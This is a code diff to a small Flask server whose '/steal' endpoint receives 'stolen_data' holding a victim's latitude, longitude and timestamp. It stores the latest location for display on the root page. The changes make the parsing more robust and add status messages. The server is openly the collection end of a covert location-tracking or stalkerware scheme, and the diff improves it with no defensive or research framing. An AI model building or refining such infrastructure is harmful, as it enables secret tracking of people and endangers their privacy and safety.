@@ -3,7 +3,6 @@ from flask import Flask, request, jsonify
 app = Flask(__name__)
 
 latest_location = {"latitude": None, "longitude": None, "timestamp": None}
-
 @app.route('/steal', methods=['POST'])
 def steal_data():
     global latest_location
@@ -11,16 +10,18 @@ def steal_data():
         data = request.json.get("stolen_data", None)
         print(f"[!] Received: {data}")
 
-        # Try parsing as JSON string from app
+        # Safely try to parse JSON string
         import json
-        parsed = json.loads(data)
+        parsed = json.loads(data) if isinstance(data, str) else data
         if "latitude" in parsed and "longitude" in parsed:
             latest_location = parsed
+            print("✅ Location updated")
 
     except Exception as e:
-        print("Error:", e)
+        print("❌ Error parsing data:", e)
 
     return jsonify({"status": "received"}), 200
+
     
 @app.route('/')
 def show_location():
